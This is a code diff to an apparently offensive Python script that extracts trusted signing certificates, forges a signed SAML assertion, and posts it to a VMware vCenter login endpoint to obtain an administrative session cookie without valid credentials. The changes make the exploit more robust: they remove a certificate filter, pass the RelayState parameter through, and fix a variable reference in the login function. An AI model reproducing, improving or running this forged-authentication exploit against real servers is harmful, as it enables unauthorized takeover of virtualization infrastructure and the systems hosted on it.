@@ -183,11 +183,6 @@ def get_trusted_cert1(stream, verbose=False):
             if verbose:
                 print(f'[!] Cert 1 size: {cert1_size}')
 
-            if b'ssoserverSign' not in cert1_bytes:
-                if verbose:
-                    print('[!] Cert does not contain ssoserverSign - keep looking')
-                continue
-      
             cert1 = writepem(cert1_bytes, verbose)
             if not check_key_valid(cert1):
                 continue
@@ -243,7 +238,7 @@ def saml_request(vcenter):
         sr = parse_qs(o.query)["SAMLRequest"][0]
         dec = base64.decodebytes(sr.encode("utf-8"))
         req = zlib.decompress(dec, -8)
-        return etree.fromstring(req)
+        return etree.fromstring(req), parse_qs(o.query)["RelayState"][0]
     except:
         print(f'[-] Failed initiating SAML request with {vcenter}')
         raise
@@ -285,16 +280,22 @@ def sign_assertion(root, cert1, cert2, key):
         raise
 
 
-def login(vcenter, saml_resp):
+def login(vcenter, saml_resp, relaystate):
     """Log in to the vCenter web UI using the signed response and return a session cookie"""
     try:
         print('[*] Attempting to log into vCenter with the signed SAML request')
-        resp = etree.tostring(s, xml_declaration=True, encoding="UTF-8", pretty_print=False)
+        resp = etree.tostring(saml_resp, xml_declaration=True, encoding="UTF-8", pretty_print=False)
+
+        if relaystate == None:
+            data = {"SAMLResponse": base64.encodebytes(resp)}
+        else:
+            data = {"SAMLResponse": base64.encodebytes(resp), "RelayState":relaystate}
+
         r = requests.post(
             f"https://{vcenter}/ui/saml/websso/sso",
             allow_redirects=False,
             verify=False,
-            data={"SAMLResponse": base64.encodebytes(resp)},
+            data=data,
         )
         if r.status_code != 302:
             raise Exception("expected 302 redirect")
@@ -344,7 +345,8 @@ if __name__ == '__main__':
 
     # Generate SAML request
     hostname = get_hostname(args.target)
-    req = saml_request(args.target)
+
+    req, relaystate = saml_request(args.target)
     t = fill_template(hostname, args.target, domain,req)
     s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
-    c = login(args.target, s)
+    c = login(args.target, s, relaystate)
